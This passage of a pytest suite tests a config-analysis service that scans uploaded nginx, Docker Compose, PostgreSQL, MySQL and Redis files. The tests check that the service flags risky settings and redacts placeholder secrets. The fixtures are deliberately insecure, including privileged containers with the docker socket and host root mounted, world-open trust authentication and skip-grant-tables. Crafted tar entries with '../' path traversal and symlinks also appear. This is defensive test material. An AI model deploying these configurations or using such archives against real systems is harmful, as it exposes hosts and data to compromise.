            "/analyze/nginx-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    reasons = {item["skip_reason"] for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "path_traversal" in reasons
    assert "not_regular_file:symlink" in reasons
    assert "not_regular_file:hardlink" in reasons
    assert "nginx_config_path_traversal" in {finding["id"] for finding in payload["findings"]}
    assert "nginx_config_not_regular_file" in {finding["id"] for finding in payload["findings"]}
    assert "super-secret-password" not in serialized


@pytest.mark.anyio
async def test_analyze_nginx_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "NGINX_CONFIG_MAX_FILES", 1)
    monkeypatch.setattr(runner, "NGINX_CONFIG_MAX_FILE_BYTES", 80)
    monkeypatch.setattr(runner, "NGINX_CONFIG_MAX_TOTAL_BYTES", 120)
    archive_path = write_zip_archive(
        tmp_path,
        {
            "nginx/main.conf": b"server {\n  listen 80;\n}\n",
            "nginx/secret.conf": b"set $password " + b"x" * 100 + b";\n",
            "nginx/extra.conf": b"server {\n  server_tokens on;\n}\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/nginx-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["truncated"] is True
    assert "file_too_large" in reasons
    assert "too_many_files" in reasons
    assert "xxxxxxxxxxxxxxxxxxxxxxxx" not in serialized


@pytest.mark.anyio
async def test_analyze_compose_config_reports_findings_and_redacts_secrets(monkeypatch, tmp_path):
    compose_file = b'''
# privileged: true
services:
  web:
    image: nginx:latest
    build:
      context: ../app
    ports:
      - "0.0.0.0:5432:5432"
      - "8080:8080"
      - "8000-8002:8000-8002"
    environment:
      POSTGRES_PASSWORD: super-secret-password
      API_KEY: raw-api-key-123456
      DATABASE_URL: postgres://user:pass@example.com/db
      REDIS_URL: redis://:super-secret-password@redis:6379/0
    env_file:
      - .env.production
    secrets:
      - source: db_password
        target: db_password
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - /root/.ssh:/keys
      - /:/host
      - app-data:/data
    networks:
      - public
    privileged: true
    cap_add:
      - NET_ADMIN
    security_opt:
      - seccomp:unconfined
    network_mode: host
    pid: host
    ipc: host
    depends_on:
      db:
        condition: service_started
    links:
      - db
    profiles:
      - prod
    labels:
      - "com.example.token=token_should_never_render"
    command: "echo POSTGRES_PASSWORD=super-secret-password"
  worker:
    image: busybox
    restart: always
    ports:
      - "127.0.0.1:2222:22"
networks:
  public:
    external: true
volumes:
  app-data:
secrets:
  db_password:
    file: ./secrets/db_password.txt
x-private-key: |
  -----BEGIN PRIVATE KEY-----
  token_should_never_render
  -----END PRIVATE KEY-----
'''
    override_file = b'''
services:
  web:
    image: app:dev
'''
    archive_path = write_zip_archive(
        tmp_path,
        {
            "deploy/compose/docker-compose.yml": compose_file,
            "deploy/compose/docker-compose.override.yml": override_file,
            ".env.production": b"POSTGRES_PASSWORD=super-secret-password\n",
            "secrets/db_password.txt": b"db_password_plaintext\ncompose_secret_file_should_not_render\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/compose-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["analyzer"] == "compose_config_basic"
    assert payload["summary"]["files_reviewed"] == 2
    assert payload["summary"]["compose_files_detected"] == 2
    assert payload["summary"]["services_detected"] == 3
    assert payload["summary"]["published_ports_detected"] >= 4
    assert payload["summary"]["env_files_detected"] >= 2
    assert "compose_environment_secret_like_value" in finding_ids
    assert "compose_environment_secret_like_key" in finding_ids
    assert "compose_env_file_reference" in finding_ids
    assert "compose_env_file_sensitive_present" in finding_ids
    assert "compose_secrets_defined" in finding_ids
    assert "compose_secret_file_reference" in finding_ids
    assert "compose_plaintext_private_key_hint" in finding_ids
    assert "compose_credential_url_hint" in finding_ids
    assert "compose_port_published_all_interfaces" in finding_ids
    assert "compose_sensitive_port_published" in finding_ids
    assert "compose_database_port_published" in finding_ids
    assert "compose_admin_port_published" in finding_ids
    assert "compose_dashboard_port_published" in finding_ids
    assert "compose_port_range_published" in finding_ids
    assert "compose_host_network_mode" in finding_ids
    assert "compose_privileged_true" in finding_ids
    assert "compose_cap_add_present" in finding_ids
    assert "compose_security_opt_disabled_hint" in finding_ids
    assert "compose_user_root_or_missing" in finding_ids
    assert "compose_read_only_missing" in finding_ids
    assert "compose_pid_host" in finding_ids
    assert "compose_ipc_host" in finding_ids
    assert "compose_docker_socket_mounted" in finding_ids
    assert "compose_sensitive_host_path_mounted" in finding_ids
    assert "compose_root_host_path_mounted" in finding_ids
    assert "compose_ssh_key_path_mounted" in finding_ids
    assert "compose_var_run_mounted" in finding_ids
    assert "compose_bind_mount_writeable_sensitive" in finding_ids
    assert "compose_named_volume_present" in finding_ids
    assert "compose_image_latest_tag" in finding_ids
    assert "compose_image_missing_digest" in finding_ids
    assert "compose_image_unpinned_tag" in finding_ids
    assert "compose_build_context_present" in finding_ids
    assert "compose_build_context_parent_path_hint" in finding_ids
    assert "compose_external_network_present" in finding_ids
    assert "compose_network_internal_missing" in finding_ids
    assert "compose_links_legacy_present" in finding_ids
    assert "compose_healthcheck_missing" in finding_ids
    assert "compose_restart_policy_missing" in finding_ids
    assert "compose_restart_always_hint" in finding_ids
    assert "compose_depends_on_without_health_condition" in finding_ids
    assert "compose_resource_limits_missing" in finding_ids
    assert "compose_multiple_files_detected" in finding_ids
    assert "compose_override_file_detected" in finding_ids
    assert "compose_profiles_present" in finding_ids
    assert any(item["read"] is False and item["path"] == ".env.production" for item in payload["env_files"])
    assert "[REDACTED]" in serialized
    for secret in (
        "super-secret-password",
        "raw-api-key-123456",
        "token_should_never_render",
        "POSTGRES_PASSWORD=super-secret-password",
        "postgres://user:pass@example.com/db",
        "redis://:super-secret-password@redis:6379/0",
        "registry-user:registry-pass",
        "PRIVATE KEY",
        "db_password_plaintext",
        "compose_secret_file_should_not_render",
    ):
        assert secret not in serialized


@pytest.mark.anyio
async def test_analyze_compose_config_comments_context_and_malformed(monkeypatch, tmp_path):
    compose_file = b'''
# services:
#   app:
#     privileged: true
services:
  app:
    image: alpine:3.20
    environment:
      PASSWORD: ${PASSWORD}
'''
    malformed_file = b'''
version: "3"
networks:
  public: {}
'''
    archive_path = write_zip_archive(
        tmp_path,
        {
            "examples/compose.yml": compose_file,
            "examples/compose.extra.yml": malformed_file,
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/compose-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    env_key_finding = next(finding for finding in payload["findings"] if finding["id"] == "compose_environment_secret_like_key")
    assert response.status_code == 200
    assert "compose_privileged_true" not in finding_ids
    assert "compose_environment_secret_like_value" not in finding_ids
    assert "compose_environment_secret_like_key" in finding_ids
    assert "compose_unsupported_or_malformed_yaml" in finding_ids
    assert env_key_finding["context"] == "example"
    assert env_key_finding["level"] == "info"


@pytest.mark.anyio
async def test_analyze_compose_config_skips_unsafe_archive_entries(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        traversal_content = b'services:\n  app:\n    environment:\n      PASSWORD: super-secret-password\n'
        traversal_info = tarfile.TarInfo("../docker-compose.yml")
        traversal_info.size = len(traversal_content)
        archive.addfile(traversal_info, io.BytesIO(traversal_content))

        link_info = tarfile.TarInfo("compose.yml")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real-compose.yml"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo("docker-compose.yml")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real-compose.yml"
        archive.addfile(hardlink_info)

        env_content = b"POSTGRES_PASSWORD=super-secret-password\n"
        env_info = tarfile.TarInfo(".env")
        env_info.size = len(env_content)
        archive.addfile(env_info, io.BytesIO(env_content))

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/compose-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    reasons = {item["skip_reason"] for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "path_traversal" in reasons
    assert "not_regular_file:symlink" in reasons
    assert "not_regular_file:hardlink" in reasons
    assert "real_env_file_not_read" in reasons
    assert "compose_config_path_traversal" in {finding["id"] for finding in payload["findings"]}
    assert "compose_config_not_regular_file" in {finding["id"] for finding in payload["findings"]}
    assert "compose_env_file_sensitive_present" in {finding["id"] for finding in payload["findings"]}
    assert "super-secret-password" not in serialized


@pytest.mark.anyio
async def test_analyze_compose_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "COMPOSE_CONFIG_MAX_FILES", 1)
    monkeypatch.setattr(runner, "COMPOSE_CONFIG_MAX_FILE_BYTES", 120)
    monkeypatch.setattr(runner, "COMPOSE_CONFIG_MAX_TOTAL_BYTES", 180)
    archive_path = write_zip_archive(
        tmp_path,
        {
            "compose.yml": b"services:\n  app:\n    image: nginx:latest\n",
            "docker-compose.prod.yml": b"services:\n  db:\n    environment:\n      PASSWORD: " + b"x" * 150 + b"\n",
            "stacks/extra.yml": b"services:\n  cache:\n    image: redis:latest\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/compose-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["truncated"] is True
    assert "file_too_large" in reasons
    assert "too_many_files" in reasons
    assert "xxxxxxxxxxxxxxxxxxxxxxxx" not in serialized


@pytest.mark.anyio
async def test_analyze_database_config_reports_findings_and_redacts_secrets(monkeypatch, tmp_path):
    postgres_conf = b'''
# listen_addresses = '*'
listen_addresses = '*'
port = 5432
ssl = off
logging_collector = off
log_connections = off
log_disconnections = off
log_statement = all
archive_mode = off
wal_level = logical
password_encryption = md5
primary_conninfo = 'postgres://user:pass@example.com/db'
db_password = 'super-secret-password'
include = '/etc/postgresql/secret.conf'
private_key = '-----BEGIN PRIVATE KEY----- raw-db-password-123456 -----END PRIVATE KEY-----'
'''
    pg_hba = b'''
# host all all 0.0.0.0/0 trust
host all all 0.0.0.0/0 trust
host replication all 0.0.0.0/0 md5
host all all ::/0 password
'''
    mysql_conf = b'''
[mysqld]
bind-address = 0.0.0.0
port = 3306
skip-networking = 0
mysqlx-bind-address = ::
skip-grant-tables
allow-empty-password = ON
local_infile = 1
secure_file_priv =
old_passwords = 1
require_secure_transport = OFF
tls_version = TLSv1,TLSv1.2
general_log = 1
slow_query_log = 0
skip-log-bin
symbolic-links = 1
secure_auth = off
password = raw-db-password-123456
dsn = mysql://user:pass@example.com/db
!includedir /etc/mysql/conf.d
'''
    archive_path = write_zip_archive(
        tmp_path,
        {
            "deploy/db/postgres/postgresql.conf": postgres_conf,
            "deploy/db/postgres/pg_hba.conf": pg_hba,
            "deploy/db/mysql/my.cnf": mysql_conf,
            ".env.production": b"PGPASSWORD=super-secret-password\n",
            ".pgpass": b"localhost:5432:*:postgres:super-secret-password pgpass_secret_should_not_render\n",
            ".my.cnf": b"[client]\npassword=raw-db-password-123456 mycnf_secret_should_not_render\n",
            ".mylogin.cnf": b"MYSQL_PWD=super-secret-password\n",
            "db/prod.sql": b"INSERT INTO users VALUES ('db_password_plaintext', 'dump_row_secret_should_not_render');\n",
            "db/backup.dump": b"replication_password_should_not_render\n",
            "db/snapshot.backup": b"MYSQL_PWD=super-secret-password\n",
            "db/legacy.bak": b"postgres://user:pass@example.com/db\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/database-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    assert response.status_code == 200
    assert payload["analyzer"] == "database_config_basic"
    assert payload["summary"]["files_reviewed"] == 3
    assert payload["summary"]["postgres_files_detected"] == 2
    assert payload["summary"]["mysql_files_detected"] == 1
    assert payload["summary"]["pg_hba_files_detected"] == 1
    assert payload["summary"]["dump_or_backup_files_detected"] == 4
    assert payload["summary"]["engines_detected"] >= 2
    assert "sensitive_file_not_read" in reasons
    assert "dump_or_backup_not_read" in reasons
    assert "database_env_file_sensitive_present" in finding_ids
    assert "database_client_credentials_file_present" in finding_ids
    assert "database_dump_or_backup_file_present" in finding_ids
    assert "database_password_like_value" in finding_ids
    assert "database_credential_url_hint" in finding_ids
    assert "database_private_key_hint" in finding_ids
    assert "database_include_absolute_path" in finding_ids
    assert "database_include_not_resolved" in finding_ids
    assert "postgres_listen_addresses_all" in finding_ids
    assert "postgres_listen_addresses_public_hint" in finding_ids
    assert "postgres_port_default_exposed_hint" in finding_ids
    assert "postgres_pg_hba_trust_auth" in finding_ids
    assert "postgres_pg_hba_md5_auth_hint" in finding_ids
    assert "postgres_pg_hba_password_auth_hint" in finding_ids
    assert "postgres_pg_hba_all_all_open_world" in finding_ids
    assert "postgres_pg_hba_replication_open_world" in finding_ids
    assert "postgres_password_encryption_weak_or_missing" in finding_ids
    assert "postgres_ssl_disabled" in finding_ids
    assert "postgres_logging_collector_off" in finding_ids
    assert "postgres_log_connections_off" in finding_ids
    assert "postgres_log_disconnections_off" in finding_ids
    assert "postgres_log_statement_all_hint" in finding_ids
    assert "postgres_archive_mode_off" in finding_ids
    assert "postgres_wal_level_replica_or_logical_hint" in finding_ids
    assert "mysql_bind_address_all" in finding_ids
    assert "mysql_skip_networking_disabled_hint" in finding_ids
    assert "mysql_port_default_exposed_hint" in finding_ids
    assert "mysql_mysqlx_bind_all_hint" in finding_ids
    assert "mysql_skip_grant_tables_enabled" in finding_ids
    assert "mysql_allow_empty_password_hint" in finding_ids
    assert "mysql_local_infile_enabled" in finding_ids
    assert "mysql_secure_file_priv_empty_or_missing_hint" in finding_ids
    assert "mysql_old_passwords_enabled_hint" in finding_ids
    assert "mysql_ssl_disabled_or_missing" in finding_ids
    assert "mysql_require_secure_transport_off" in finding_ids
    assert "mysql_tls_version_legacy_hint" in finding_ids
    assert "mysql_general_log_enabled_hint" in finding_ids
    assert "mysql_slow_query_log_disabled_hint" in finding_ids
    assert "mysql_log_bin_disabled_hint" in finding_ids
    assert "mysql_symbolic_links_enabled" in finding_ids
    assert "mysql_secure_auth_off_hint" in finding_ids
    assert any(item["read"] is False and item["path"] == ".env.production" for item in payload["files_detected"])
    assert any(item["read"] is False and item["path"] == "db/prod.sql" for item in payload["dump_or_backup_files"])
    assert any(item["resolved"] is False and item["target"] == "/etc/postgresql/secret.conf" for item in payload["includes"])
    assert "[REDACTED]" in serialized
    for secret in (
        "super-secret-password",
        "raw-db-password-123456",
        "postgres://user:pass@example.com/db",
        "mysql://user:pass@example.com/db",
        "replication_password_should_not_render",
        "PGPASSWORD=super-secret-password",
        "MYSQL_PWD=super-secret-password",
        "PRIVATE KEY",
        "db_password_plaintext",
        "dump_row_secret_should_not_render",
        "pgpass_secret_should_not_render",
        "mycnf_secret_should_not_render",
    ):
        assert secret not in serialized


@pytest.mark.anyio
async def test_analyze_database_config_comments_and_context(monkeypatch, tmp_path):
    postgres_conf = b'''
# listen_addresses = '*'
# ssl = off
password = ${PGPASSWORD}
'''
    mysql_conf = b'''
[mysqld]
# skip-grant-tables
password = ${MYSQL_PWD}
'''
    archive_path = write_zip_archive(
        tmp_path,
        {
            "examples/postgres/postgresql.conf": postgres_conf,
            "examples/mysql/my.cnf": mysql_conf,
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/database-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    secret_finding = next(finding for finding in payload["findings"] if finding["id"] == "database_password_like_value")
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "postgres_listen_addresses_all" not in finding_ids
    assert "postgres_ssl_disabled" not in finding_ids
    assert "mysql_skip_grant_tables_enabled" not in finding_ids
    assert "database_password_like_value" in finding_ids
    assert secret_finding["context"] == "example"
    assert secret_finding["level"] == "low"
    assert "PGPASSWORD" not in serialized
    assert "MYSQL_PWD" not in serialized


@pytest.mark.anyio
async def test_analyze_database_config_skips_unsafe_archive_entries(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        traversal_content = b"password = super-secret-password\n"
        traversal_info = tarfile.TarInfo("../postgresql.conf")
        traversal_info.size = len(traversal_content)
        archive.addfile(traversal_info, io.BytesIO(traversal_content))

        link_info = tarfile.TarInfo("postgresql.conf")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real-postgresql.conf"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo("db/mysql/my.cnf")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real-my.cnf"
        archive.addfile(hardlink_info)

        env_content = b"PGPASSWORD=super-secret-password\n"
        env_info = tarfile.TarInfo(".env")
        env_info.size = len(env_content)
        archive.addfile(env_info, io.BytesIO(env_content))

        dump_content = b"INSERT INTO secrets VALUES ('db_password_plaintext');\n"
        dump_info = tarfile.TarInfo("db/dump.sql")
        dump_info.size = len(dump_content)
        archive.addfile(dump_info, io.BytesIO(dump_content))

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/database-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.tar"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "path_traversal" in reasons
    assert "not_regular_file:symlink" in reasons
    assert "not_regular_file:hardlink" in reasons
    assert "sensitive_file_not_read" in reasons
    assert "dump_or_backup_not_read" in reasons
    assert "database_config_path_traversal" in {finding["id"] for finding in payload["findings"]}
    assert "database_config_not_regular_file" in {finding["id"] for finding in payload["findings"]}
    assert "database_env_file_sensitive_present" in {finding["id"] for finding in payload["findings"]}
    assert "database_dump_or_backup_file_present" in {finding["id"] for finding in payload["findings"]}
    assert "super-secret-password" not in serialized
    assert "db_password_plaintext" not in serialized


@pytest.mark.anyio
async def test_analyze_database_config_respects_file_and_byte_limits(monkeypatch, tmp_path):
    monkeypatch.setattr(runner, "DATABASE_CONFIG_MAX_FILES", 1)
    monkeypatch.setattr(runner, "DATABASE_CONFIG_MAX_FILE_BYTES", 120)
    monkeypatch.setattr(runner, "DATABASE_CONFIG_MAX_TOTAL_BYTES", 180)
    archive_path = write_zip_archive(
        tmp_path,
        {
            "postgresql.conf": b"listen_addresses = 'localhost'\n",
            "db/mysql/my.cnf": b"[mysqld]\npassword = " + b"x" * 150 + b"\n",
            "db/postgres/extra.conf": b"ssl = off\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/database-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert payload["summary"]["files_reviewed"] == 1
    assert payload["summary"]["truncated"] is True
    assert "file_too_large" in reasons
    assert "too_many_files" in reasons
    assert "xxxxxxxxxxxxxxxxxxxxxxxx" not in serialized


@pytest.mark.anyio
async def test_analyze_redis_config_reports_findings_and_redacts_secrets(monkeypatch, tmp_path):
    redis_conf = b'''
# bind 0.0.0.0
bind 0.0.0.0
bind 8.8.8.8
protected-mode no
port 6379
requirepass super-secret-password
masterauth masterauth_secret_should_not_render
aclfile /etc/redis/users.acl
user default on >ACLHASHSECRET_should_not_render
tls-port 0
tls-cert-file /etc/redis/tls.crt
tls-key-file /etc/redis/tls.key
tls-auth-clients no
tls-protocols "TLSv1 TLSv1.1 TLSv1.2"
save ""
appendonly no
appendfilename appendonly.aof
dir /var/lib/redis
dbfilename dump.rdb
rdbcompression no
replicaof redis-primary 6379
replica-read-only no
repl-diskless-sync yes
rename-command CONFIG ""
loadmodule /usr/lib/redis/modules/redisbloom.so
lua-time-limit 20000
loglevel debug
logfile ""
supervised no
daemonize yes
maxmemory-policy noeviction
timeout 0
tcp-keepalive 0
unixsocketperm 777
redis_url redis://:super-secret-password@redis:6379/0
include /etc/redis/secrets.conf
private_key -----BEGIN PRIVATE KEY----- raw-redis-password-123456 -----END PRIVATE KEY-----
'''
    sentinel_conf = b'''
sentinel monitor mymaster 10.0.0.2 6379 2
sentinel auth-pass mymaster sentinel_auth_should_not_render
sentinel down-after-milliseconds mymaster 1000
'''
    archive_path = write_zip_archive(
        tmp_path,
        {
            "deploy/redis/redis.conf": redis_conf,
            "deploy/redis/sentinel.conf": sentinel_conf,
            ".env.production": b"REDIS_PASSWORD=super-secret-password\n",
            "deploy/redis/users.acl": b"user default on >acl_password_hash_should_not_render\n",
            "deploy/redis/dump.rdb": b"dump_value_should_not_render\n",
            "deploy/redis/appendonly.aof": b"super-secret-password\n",
            "deploy/redis/appendonlydir/appendonly.aof.1.incr.aof": b"raw-redis-password-123456\n",
            "deploy/redis/redis-backup.rdb": b"ACLHASHSECRET_should_not_render\n",
            "deploy/redis/snapshot.backup": b"masterauth_secret_should_not_render\n",
            "deploy/redis/old.bak": b"redis://:super-secret-password@redis:6379/0\n",
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/redis-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    serialized = json.dumps(payload)
    reasons = {item.get("skip_reason") for item in payload["files_detected"]}
    assert response.status_code == 200
    assert payload["analyzer"] == "redis_config_basic"
    assert payload["summary"]["files_reviewed"] == 2
    assert payload["summary"]["redis_files_detected"] == 1
    assert payload["summary"]["sentinel_files_detected"] == 1
    assert payload["summary"]["acl_files_detected"] == 1
    assert payload["summary"]["dump_or_aof_files_detected"] == 6
    assert "sensitive_file_not_read" in reasons
    assert "acl_file_not_read" in reasons
    assert "dump_or_aof_not_read" in reasons
    for finding_id in (
        "redis_env_file_sensitive_present",
        "redis_acl_file_present",
        "redis_acl_file_not_read",
        "redis_dump_or_aof_file_present",
        "redis_password_like_value",
        "redis_private_key_hint",
        "redis_include_absolute_path",
        "redis_include_not_resolved",
        "redis_bind_all_interfaces",
        "redis_bind_public_address_hint",
        "redis_protected_mode_no",
        "redis_port_default_exposed_hint",
        "redis_tls_port_missing_hint",
        "redis_unixsocket_permissions_permissive",
        "redis_requirepass_present_redacted",
        "redis_masterauth_present_redacted",
        "redis_aclfile_reference",
        "redis_default_user_enabled_hint",
        "redis_tls_disabled_or_missing",
        "redis_tls_cert_path_present",
        "redis_tls_key_path_present",
        "redis_tls_auth_clients_disabled_hint",
        "redis_tls_protocols_legacy_hint",
        "redis_save_disabled_hint",
        "redis_appendonly_no",
        "redis_appendfilename_default_hint",
        "redis_dir_sensitive_path_hint",
        "redis_dbfilename_default_hint",
        "redis_rdbcompression_no_hint",
        "redis_replicaof_present",
        "redis_replica_read_only_no",
        "redis_repl_diskless_sync_enabled_hint",
        "redis_dangerous_command_renamed_to_empty_hint",
        "redis_module_load_present",
        "redis_lua_time_limit_high_hint",
        "redis_loglevel_debug_or_verbose",
        "redis_logfile_stdout_or_empty_hint",
        "redis_supervised_no_hint",
        "redis_daemonize_yes_hint",
        "redis_maxmemory_missing",
        "redis_maxmemory_policy_noeviction_hint",
        "redis_timeout_zero_hint",
        "redis_tcp_keepalive_low_or_missing_hint",
        "redis_sentinel_config_detected",
        "redis_sentinel_auth_pass_present_redacted",
        "redis_sentinel_down_after_milliseconds_low_hint",
    ):
        assert finding_id in finding_ids
    assert any(item["read"] is False and item["path"] == "deploy/redis/users.acl" for item in payload["acl_files"])
    assert any(item["read"] is False and item["path"] == "deploy/redis/dump.rdb" for item in payload["dump_or_aof_files"])
    assert any(item["resolved"] is False and item["target"] == "/etc/redis/secrets.conf" for item in payload["includes"])
    assert "[REDACTED]" in serialized
    for secret in (
        "super-secret-password",
        "raw-redis-password-123456",
        "redis://:super-secret-password@redis:6379/0",
        "masterauth_secret_should_not_render",
        "sentinel_auth_should_not_render",
        "ACLHASHSECRET_should_not_render",
        "PRIVATE KEY",
        "dump_value_should_not_render",
        "acl_password_hash_should_not_render",
    ):
        assert secret not in serialized


@pytest.mark.anyio
async def test_analyze_redis_config_comments_context_and_missing_auth(monkeypatch, tmp_path):
    redis_conf = b'''
# protected-mode no
# bind 0.0.0.0
port 6379
requirepass ${REDIS_PASSWORD}
'''
    sentinel_conf = b'''
sentinel monitor mymaster 127.0.0.1 6379 2
'''
    archive_path = write_zip_archive(
        tmp_path,
        {
            "examples/redis/redis.conf": redis_conf,
            "examples/redis/sentinel.conf": sentinel_conf,
        },
    )
    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

    async with AsyncClient(transport=transport, base_url="http://testserver") as client:
        response = await client.post(
            "/analyze/redis-config",
            json={"file_id": "f" * 32, "relative_path": str(archive_path.relative_to(tmp_path)), "original_filename": "project.zip"},
        )

    payload = response.json()
    finding_ids = {finding["id"] for finding in payload["findings"]}
    requirepass_finding = next(finding for finding in payload["findings"] if finding["id"] == "redis_requirepass_present_redacted")
    sentinel_auth_finding = next(finding for finding in payload["findings"] if finding["id"] == "redis_sentinel_monitor_without_auth_hint")
    serialized = json.dumps(payload)
    assert response.status_code == 200
    assert "redis_protected_mode_no" not in finding_ids
    assert "redis_bind_all_interfaces" not in finding_ids
    assert requirepass_finding["context"] == "example"
    assert requirepass_finding["level"] == "low"
    assert sentinel_auth_finding["context"] == "example"
    assert sentinel_auth_finding["level"] == "info"
    assert "REDIS_PASSWORD" not in serialized


@pytest.mark.anyio
async def test_analyze_redis_config_skips_unsafe_archive_entries(monkeypatch, tmp_path):
    uploads_dir = tmp_path / "uploads"
    uploads_dir.mkdir(exist_ok=True)
    archive_path = uploads_dir / "project.tar"
    with tarfile.open(archive_path, "w") as archive:
        traversal_content = b"requirepass super-secret-password\n"
        traversal_info = tarfile.TarInfo("../redis.conf")
        traversal_info.size = len(traversal_content)
        archive.addfile(traversal_info, io.BytesIO(traversal_content))

        link_info = tarfile.TarInfo("deploy/redis/redis.conf")
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = "real-redis.conf"
        archive.addfile(link_info)

        hardlink_info = tarfile.TarInfo("deploy/redis/redis-extra.conf")
        hardlink_info.type = tarfile.LNKTYPE
        hardlink_info.linkname = "real-redis-extra.conf"
        archive.addfile(hardlink_info)

        env_content = b"REDIS_PASSWORD=super-secret-password\n"
        env_info = tarfile.TarInfo(".env")
        env_info.size = len(env_content)
        archive.addfile(env_info, io.BytesIO(env_content))

        acl_content = b"user default on >acl_password_hash_should_not_render\n"
        acl_info = tarfile.TarInfo("users.acl")
        acl_info.size = len(acl_content)
        archive.addfile(acl_info, io.BytesIO(acl_content))

        dump_content = b"dump_value_should_not_render\n"
        dump_info = tarfile.TarInfo("dump.rdb")
        dump_info.size = len(dump_content)
        archive.addfile(dump_info, io.BytesIO(dump_content))

    monkeypatch.setattr(runner, "DATA_DIR", tmp_path.resolve())
    transport = ASGITransport(app=runner.app)

